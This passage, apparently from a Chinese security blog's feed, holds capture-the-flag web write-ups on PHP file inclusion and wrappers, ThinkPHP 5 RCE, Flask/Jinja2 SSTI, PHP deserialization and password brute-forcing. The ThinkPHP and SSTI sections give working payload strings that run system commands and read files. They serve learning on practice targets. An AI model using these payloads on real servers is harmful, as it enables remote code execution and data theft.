alt="在这里插入图片描述"><br>当然，可以包含的文件肯定不只局限于该目录下，例如，我们可以读取系统配置文件 <code>C:\WINDOWS\system.ini</code>，and so on.</p><p><img src="https://img-blog.csdnimg.cn/20200730125341646.png" alt="在这里插入图片描述"><br>在上面所举的例子中，服务器端没有对动态调用的变量值进行任何的过滤，即用户可以随意控制变量的值，这种情况在现实中应该是不太可能出现的。那么如果开发者在开发中就限制了所能包含的文件的后缀名的话，又要如何绕过呢。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">例如，可以将先前的源码稍作修改如下:</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$file &#x3D; isset($_GET[&quot;page&quot;])?($_GET[&quot;page&quot;] . &#39;.php&#39;):&#39;homepage.php&#39;;</span><br><span class="line">include($file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200730133358343.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200730133602323.png" alt="在这里插入图片描述"><br>可以看到，现在我们只能包含指定后缀名的文件。But don’t worry，我们可以使用 <code>%00</code> 截断的方式来进行绕过。<br>但是使用该方法有一些前提条件，如下：</p><p><img src="https://img-blog.csdnimg.cn/20200730134803486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>由于本人安装的 PHP 版本大于5.3，要实操一遍挺麻烦的，，，So，这里就直接附上相关博客来说明该方法了。<br><a href="http://www.bugsafe.cn/archives/167.html" target="_blank" rel="noopener">谈一谈文件包含漏洞</a> 或 <a href="https://www.jianshu.com/p/3514f0fd79f7" target="_blank" rel="noopener">文件包含漏洞学习总结</a></p><h3 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h3><p>远程文件包含，Remote File Inclusion，RFI。当包含的文件在远程服务器上时，就形成了远程文件包含。</p><p>要实现远程文件包含有两点需要注意：</p><p>需要 PHP 配置文件 <code>php.ini</code> 内的 <code>allow_url_include = on</code> 以及 <code>allow_url_fopen=on</code></p><p>由于我还没弄明白怎么整一个远程服务器的环境……所以这里又没有实操……<br>相关知识点的分析和具体操作仍可参考上述两篇博客。</p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>PHP 带有很多内置 URL 风格的封装协议，这些协议常在CTF题目中与文件包含漏洞相结合。现以本文最初编写的页面为环境，来举例部分伪协议在文件包含漏洞中的应用。PHP 官方文档中相关内容的描述可查看该页面，<a href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">PHP：支持的协议和封装协议</a></p><h5 id="1-data"><a href="#1-data" class="headerlink" title="1`  data://"></a>1`  <code>data://</code></h5><p>该协议有两种使用方法，参数为需要执行的 PHP 代码。</p><ul><li><code>data:text/plain,需要执行的 PHP 代码</code><br><img src="https://img-blog.csdnimg.cn/20200730170501487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li><code>data:text/plain;base64,需要执行的base64编码后的 PHP 代码</code><br><img src="https://img-blog.csdnimg.cn/20200730172059834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200730172121793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里有一点需要特别注意的地方，<strong>base64编码后如果有加号需要手动的进行url编码（即将 + 替换成 %2b），否则无法识别</strong>。例如：</li></ul><p><img src="https://img-blog.csdnimg.cn/20200730172912920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200730173015509.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200730173038454.png" alt="在这里插入图片描述"></p><h5 id="2-php-input"><a href="#2-php-input" class="headerlink" title="2`  php://input"></a>2`  <code>php://input</code></h5><p>这个协议的利用方法是将需要执行的 PHP 代码写在 POST 中提交，不用键值对的形式，只写代码即可。</p><p><img src="https://img-blog.csdnimg.cn/20200730193451744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>NOTICE：</strong><br><strong>在验证该协议的使用中遇到了一些问题，暂时还不知道原因，先在此记录下来。</strong></p><p>① 使用 burpsuite 抓本地包时，域名需使用本机的 IPv4 地址，如果域名使用 127.0.0.1 或者 localhost 的话无法抓取到本地包；该点可参考博客 <a href="https://blog.csdn.net/qq_43662512/article/details/99698833?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight" target="_blank" rel="noopener">关于BurpSuite抓不到本地包的问题解决方法汇总</a></p><p>② 此处不知为何无法使用火狐的 hackbar 插件来提交 POST 参数；下图左半部分内容来自博客 <a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">php伪协议实现命令执行的七种姿势</a>，右半部分内容为本人验证时的操作结果。</p><p><img src="https://img-blog.csdnimg.cn/20200730195155529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="3-php-filter"><a href="#3-php-filter" class="headerlink" title="3`  php://filter"></a>3`  <code>php://filter</code></h5><p>使用该伪协议可以实现读取 PHP 文件源码并以 base64 编码格式输出的功能。<br>该功能的使用方法为<code>php://filter/read=convert.base64-encode/resource=想要读取内容的PHP文件</code> </p><p><img src="https://img-blog.csdnimg.cn/20200730202027357.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200730202054423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="4-file"><a href="#4-file" class="headerlink" title="4`  file://"></a>4`  <code>file://</code></h5><p>该协议用于访问本地文件系统。在CTF中通常用来读取本地文件，不受 <code>allow_url_fopen</code> 与 <code>allow_url_include</code> 的影响。使用方法为 <code>file://文件的绝对路径</code></p><p><img src="https://img-blog.csdnimg.cn/20200730203320370.png" alt="在这里插入图片描述"></p><h5 id="5-zip"><a href="#5-zip" class="headerlink" title="5`  zip://"></a>5`  <code>zip://</code></h5><p>该协议可以访问压缩文件中的文件，和 <code>file://</code> 一样都需要传入文件的绝对路径。<br>使用方法为 <code>zip://压缩包绝对路径#压缩文件内的文件名</code> ，这里需要注意，<strong>需要手动对中间的 # 号进行url编码（即将 # 替换成 %23）</strong></p><p><img src="https://img-blog.csdnimg.cn/20200730204926696.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件包含漏洞(File Inclusion) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF系列 // Web | php_rce &amp; Web_python_template_injection</title>
      <link href="/2020/07/26/XCTF%E7%B3%BB%E5%88%97-Web-php_rce-&amp;-Web_python_template_injection/"/>
      <url>/2020/07/26/XCTF%E7%B3%BB%E5%88%97-Web-php_rce-&amp;-Web_python_template_injection/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　这两题涉及到的知识点有，<strong><em>ThinkPHP 的远程代码执行漏洞</em></strong> 以及 <strong><em>Flask的 SSTI 漏洞（服务端模板注入）</em></strong> 。</p><a id="more"></a><h3 id="1-php-rce"><a href="#1-php-rce" class="headerlink" title="1` php_rce"></a>1` php_rce</h3><p>ThinkPHP 是一个轻量级国产 PHP 开发框架，它可以支持 windows/Unix/Linux 等服务器环境。在 ThinkPHP 5 中出现了由于变量覆盖而引起的 RCE（<em>远程命令/代码执行漏洞 – remote command/code execute</em>），其漏洞根本源于 thinkphp/library/think/Request.php 中 method 方法可以进行变量覆盖，通过覆盖类的核心属性 filter 导致 rce 。<br>　　<br>关于 ThinkPHP 5 中该漏洞的详细分析可参考此文章 <a href="https://www.freebuf.com/news/200585.html" target="_blank" rel="noopener">ThinkPHP 5.1框架结合RCE漏洞的深入分析</a> 。<br>关于命令执行漏洞可参考早些时候写的博客 <a href="https://c-0-re.github.io/2020/07/11/XCTF%E7%B3%BB%E5%88%97-Web-ez%E9%A2%98-Writeup/" target="_blank" rel="noopener">XCTF系列 // Web ez题 Writeup 中的 6` command_execution</a> 。</p><p>漏洞还没看明白……只会用payload……</p><p>在这里贴上常见的一种简单payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">模板之一：</span><br><span class="line">index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;相关的php代码</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;开头的index.php默认的话可以不需要</span><br></pre></td></tr></table></figure><p>例如：</p><h5 id="以-flag-为关键词查找相关文件："><a href="#以-flag-为关键词查找相关文件：" class="headerlink" title="以 flag 为关键词查找相关文件："></a>以 flag 为关键词查找相关文件：</h5><p><code>index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag*&quot;</code></p><h5 id="显示指定文件内容（例如-flag）："><a href="#显示指定文件内容（例如-flag）：" class="headerlink" title="显示指定文件内容（例如 /flag）："></a>显示指定文件内容（例如 /flag）：</h5><p><code>index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></p><h5 id="查看whoami："><a href="#查看whoami：" class="headerlink" title="查看whoami："></a>查看whoami：</h5><p><code>index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></p><h5 id="查看phpinfo："><a href="#查看phpinfo：" class="headerlink" title="查看phpinfo："></a>查看phpinfo：</h5><p><code>index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></p><h3 id="2-Web-python-template-injection"><a href="#2-Web-python-template-injection" class="headerlink" title="2` Web_python_template_injection"></a>2` Web_python_template_injection</h3><p>本题题目为 template_injection ，即模板注入。</p><p>在介绍 <strong>SSTI（模板注入）</strong> 之前，首先先来介绍一下 <strong>SST（模板引擎）</strong>，百度百科中对其的描述为，模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，如用于网站的模板引擎会生成一个标准的HTML文档。<br>模板引擎的实现方式有很多，最简单的是“置换型”模板引擎，这类模板引擎只是<strong>将指定模板内容（字符串）中的特定标记（子字符串）替换一下便生成了最终需要的业务数据（比如网页）。</strong></p><p>个人对其的理解就是，我预先写好了一个比较通用的模板内容，在这个模板中的某些地方是空着的，因为这些地方的内容会依具体需要而不同。当我需要生成 HTML 代码的时候，我可以借助该模板，通过脚本语言传入变量数据，使用模板引擎将模板中空着的地方替换为我们输入的数据。</p><p>例如，定义一个模板，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;&#123;$content&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>如果我需要生成 &lt;h1&gt;realContent&lt;/h1&gt; 这么一个 HTML 内容，那么我可以将 realContent 作为数据传给模板引擎，让它将其渲染到模板中，渲染完成后的结果即为，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;realContent&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>模板引擎有很多，例如，Smarty 是一个基于 PHP 开发的 PHP 模板引擎，JINJA2 是基于 Python 的模板引擎，Velocity 是一个基于 Java 的模板引擎，And so on。</p><p>本题题目中的提示为 Python ，故对应的是 Jinja2 模板引擎。这里又不得不提到 Flask ，Flask 是一个使用 Python 编写的轻量级 Web 应用框架。它使用的模板引擎即为 Jinja2 。</p><p>Flask 模块的渲染方法有 <code>render_template</code> 和 <code>render_template_string</code> 两种。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">render_template() 用来渲染一个指定的文件</span><br><span class="line">例如：return render_template(&#39;index.html&#39;)</span><br><span class="line"></span><br><span class="line">render_template_string() 则是用来渲染一个字符串的，SSTI与这个方法密不可分</span><br><span class="line">例如：html &#x3D; &#39;&lt;h1&gt;This is index page&lt;&#x2F;h1&gt;&#39;</span><br><span class="line">      return render_template_string(html)</span><br></pre></td></tr></table></figure><p>接下来开始介绍 SSTI（模板注入），Flask 模板注入的产生条件为不正确的使用 Flask 中的 render_template_string() 方法。</p><p>在 Jinja2 模板引擎中，{{}} 是变量包裹标识符。在使用 render_template_string() 的同时，使用 %s 来替换字符串的时候，会把字符串中被 {{}} 包围的内容当作变量解析。{{}} 并不仅仅可以传递变量，还可以执行一些简单的表达式。</p><p>由于没有搭建相关环境，模板注入相关示例可参照：<a href="https://www.cnblogs.com/-chenxs/p/11971164.html" target="_blank" rel="noopener">python-flask模块注入(SSTI)</a>，在这里顺便附上本题相关 writeup 中关于模板注入的描述如下：</p><p><img src="https://img-blog.csdnimg.cn/20200726092803677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200726093559215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>了解完相关知识点后，现在我们可以结合本题来具体整理分析一下。</p><p>首先通过 {{}} 变量包裹标识符进行简单的表达式测试来判断是否确实存在 SSTI 漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:46675&#x2F;&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200726094556480.png" alt="在这里插入图片描述"><br>可以看到表达式被执行了，说明确实存在 SSTI 漏洞。接下来我们就需要寻找 flag 了，首先我们需要获取到控制台权限（可以利用 Python 的 <code>os.system</code> 和 <code>os.popen</code> ，前者返回 <strong>退出状态码</strong> ，后者 <strong>以 file 形式返回输出内容</strong>，我们想要的是内容，所以选择 <code>os.popen</code>），因为我们需要实现文件读取和命令执行。But 由于我们无法直接使用这些方法，所以我们需要另辟蹊径。</p><p>Python 是面向对象的编程语言，有着类、对象和继承属性。因此我们可以通过 Python 的对象的继承来一步步实现文件查找和读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python 所有类的几个魔法方法：</span><br><span class="line"></span><br><span class="line">__class__  返回类型所属的对象（类）</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><p>由于本人 Python 水平不高……逐步获取权限的过程可参照以下博客：<br><a href="https://www.cnblogs.com/tr1ple/p/9415641.html" target="_blank" rel="noopener">python 模板注入</a><br><a href="https://blog.csdn.net/yh1013024906/article/details/84330056" target="_blank" rel="noopener">FLASK模板注入 （SSTI）</a></p><p>这两篇博客对此过程都有很详细的描述，获取到权限以后，剩下的事情就很简单了。</p><p>直接上 Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查看文件（ls）：</span><br><span class="line">①&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].listdir(&#39;.&#x2F;&#39;)&#125;&#125;</span><br><span class="line">②&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">文件读取：</span><br><span class="line">①&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;相关文件名&#39;).read()&#125;&#125;</span><br><span class="line">②&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat 相关文件名&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200726102439157.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200726102605502.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SSTI(服务端模板注入) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF系列 // Web | unserialize3</title>
      <link href="/2020/07/23/XCTF%E7%B3%BB%E5%88%97-Web-unserialize3/"/>
      <url>/2020/07/23/XCTF%E7%B3%BB%E5%88%97-Web-unserialize3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　本题涉及到的知识点主要有，<strong><em>PHP 对象的序列化与反序列化</em></strong> 以及在反序列化中的 <strong><em>__wakeup() 函数漏洞</em></strong>。</p><a id="more"></a><h3 id="PHP-对象序列化与反序列化"><a href="#PHP-对象序列化与反序列化" class="headerlink" title="PHP 对象序列化与反序列化"></a>PHP 对象序列化与反序列化</h3><p>　　所有 PHP 里面的值都可以使用函数 <code>serialize()</code> 来返回一个包含字节流的字符串来表示。函数 <code>unserialize()</code> 能够把字符串重新变回 PHP 原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。为了能够 unserialize() 一个对象，这个对象的类必须已经定义过。<br>　　如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数 <code>spl_autoload_register()</code> 来实现。</p><h3 id="函数-sleep-和-wakeup"><a href="#函数-sleep-和-wakeup" class="headerlink" title="函数 __sleep() 和 __wakeup()"></a>函数 __sleep() 和 __wakeup()</h3><p>　　这两个函数均为 PHP 中的魔术方法。serialize() 函数会检查类中是否存在一个 <code>__sleep()</code> 方法，如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。<br>　　与之相反，unserialize() 函数会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 __wakeup() 方法，预先准备对象需要的资源。<code>__wakeup()</code> 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</p><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h3><p>　　该漏洞的主要原理为，__wakeup() 函数触发于 unserilize() 函数调用之前，当序列化字符串中<strong>表示对象属性个数的值大于真实个数的属性时就会导致反序列化失败同时使得 __wakeup() 函数失效</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">序列化返回的字符串格式：</span><br><span class="line">O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:&#123;&lt;field name 1&gt;&lt;field value 1&gt;...&lt;field name n&gt;&lt;field value n&gt;&#125; </span><br><span class="line"></span><br><span class="line">O:表示被序列化的是对象，除了o，该处还可以为: a表示数组、s表示字符、i表示数字</span><br><span class="line">&lt; length&gt;:表示序列化的类名称长度</span><br><span class="line">&lt; class name&gt;：表示序列化的类的名称</span><br><span class="line">&lt; n &gt;:表示被序列化的对象的属性个数&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br><span class="line">&lt; field name 1&gt;：属性名</span><br><span class="line">&lt; field value 1&gt;：属性值</span><br></pre></td></tr></table></figure><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>　　进入网页，观察到题目所给代码中存在 __wakeup() 函数，同时结合本题题目为 unserialize3 可知，本题考察点应该为 PHP 反序列化及 __wakeup() 函数漏洞。</p><p>　　<img src="https://img-blog.csdnimg.cn/20200723183630989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　既然题目要反序列化，肯定首先要有一个序列化的字符串。由于题目代码中只给了我们一个类，并没有给出一个明显的序列化字符串，故可尝试编写程序，先将该类实例化一个对象，再将该对象序列化，进而得到该字符串。</p><p>　　<img src="https://img-blog.csdnimg.cn/2020072318591484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　得到的字符串如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure><p>　　观察题目剩余部分，可以看到题目给出提示，我们应该使用 ?code= 来进行传参。<br>　　同时我们需要利用 PHP 反序列化漏洞来绕过 __wakeup() 函数，如果不绕过 __wakeup() 方法，那么将会输出”bad requests”并退出脚本。</p><p><img src="https://img-blog.csdnimg.cn/20200723191029881.png" alt="在这里插入图片描述"><br>　　综上，我们应该将上述的序列化的字符串中的对象属性个数由真实值1修改为任意大于1的数，然后将其传给 code 即可得到 flag。</p><p><img src="https://img-blog.csdnimg.cn/20200723191008306.png" alt="在这里插入图片描述"><br>本题相关知识点在 PHP 手册中的描述及详解如下：<br><a href="https://www.php.net/manual/zh/language.oop5.serialization.php" target="_blank" rel="noopener">PHP:对象序列化</a><br><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup" target="_blank" rel="noopener">PHP:魔术方法</a></p><p>PS. <a href="https://www.php.cn/php-weizijiaocheng-415420.html" target="_blank" rel="noopener">关于 PHP 中访问修饰符( public、private 和 protected )的相关知识点可参考该链接</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP反序列化漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF系列 // Web ez题 Writeup</title>
      <link href="/2020/07/11/XCTF%E7%B3%BB%E5%88%97-Web-ez%E9%A2%98-Writeup/"/>
      <url>/2020/07/11/XCTF%E7%B3%BB%E5%88%97-Web-ez%E9%A2%98-Writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>　　最近注册了攻防世界的账号，so 先把 WEB 的简单题做了熟悉一下平台操作，借此博客整理记录一下 EZ 题中相对较难的一些题目的题解和相关知识点。</p><h5 id="本文涉及的部分知识点：PHP弱类型比较、命令执行漏洞"><a href="#本文涉及的部分知识点：PHP弱类型比较、命令执行漏洞" class="headerlink" title="本文涉及的部分知识点：PHP弱类型比较、命令执行漏洞"></a>本文涉及的部分知识点：PHP弱类型比较、命令执行漏洞</h5><a id="more"></a><h3 id="1-robots"><a href="#1-robots" class="headerlink" title="1` robots"></a>1` robots</h3><p>　　robots 协议也叫 robots.txt 是一种存放于网站根目录下的ASCII编码的文本文件，它用来告知搜索引擎（或网络爬虫）哪些内容能被抓取，哪些内容不能被抓取。因为一些系统中的URL是大小写敏感的，所以 robots.txt 的文件名应统一为小写。<br>　　进入本题场景，网页中什么内容也没有，不过没有关系，既然题目为 robots ，故可以先访问 robots.txt 看看。</p><p><img src="https://img-blog.csdnimg.cn/20200708161959733.png" alt="在这里插入图片描述"><br>　　在该页面可以看到明显的提示，故直接访问 f1ag_1s_h3re.php 页面就可以得到flag。</p><h3 id="2-backup"><a href="#2-backup" class="headerlink" title="2` backup"></a>2` backup</h3><p>　　本题题目描述中给出了 “备份文件” 这个信息，由此想到相关后缀名应为.bak。既然题目要求访问 index.php 的备份文件，故访问 index.php.bak 浏览器即可下载得到该文件。用Sublime打开该文件，即可得到flag。</p><p><img src="https://img-blog.csdnimg.cn/20200708164328562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="3-weak-auth"><a href="#3-weak-auth" class="headerlink" title="3` weak_auth"></a>3` weak_auth</h3><p>　　打开本题网页，发现需要登录，在该页面没有发现什么线索，所以先随便输入一个账号密码试试。</p><p><img src="https://img-blog.csdnimg.cn/20200708171451704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　可以看到，网站弹出提示，要求我们使用 admin 的用户名来登录，同时我们可以查看该页面的源码，发现提示，建议使用字典来爆破密码。</p><p><img src="https://img-blog.csdnimg.cn/20200708171809337.png" alt="在这里插入图片描述"><br>　　因此，使用 Burpsuite 爆破密码即可得到 flag。（这题使用 Burpsuite 自带的字典不太好用。。。在这里贴一个还算比较全的字典吧：<a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a>）</p><p><img src="https://img-blog.csdnimg.cn/20200708172158906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="4-simple-php"><a href="#4-simple-php" class="headerlink" title="4` 